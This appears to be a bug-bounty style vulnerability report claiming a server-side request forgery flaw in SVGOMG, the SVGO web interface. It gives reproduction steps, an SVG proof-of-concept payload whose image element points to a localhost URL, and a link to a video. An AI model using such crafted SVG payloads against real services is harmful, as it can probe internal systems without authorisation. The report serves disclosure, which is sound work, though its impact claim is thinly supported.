# :book: Description


 `SVGOMG` is SVGO's Missing GUI, aiming to expose the majority, if not all the configuration options of SVGO. This package is vulnerable for `(SSRF)`.

https://github.com/jakearchibald/svgomg
https://jakearchibald.github.io/svgomg/
# :recycle:  Steps To Reproduce-:  
  0) download and run latest release from hhttps://github.com/jakearchibald/svgomg Or use demo https://jakearchibald.github.io/svgomg/
  1) open payload svg file . Payload used : `rc3.svg`
  ```
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:relative" width="300" height="200" overflow="hidden">
  <image x="10" y="10" width="276" height="110" xlink:href="http://localhost:8080/svg"/>
  <path d="M0 150h300v10H0z"/>
  </svg>
  ```

# :telescope: POC
https://drive.google.com/file/d/1KvTH4V0LhthKfJ_SM8ygINe5Ot_UTxUb/view?usp=sharing
## 💥 Impact
SSRF
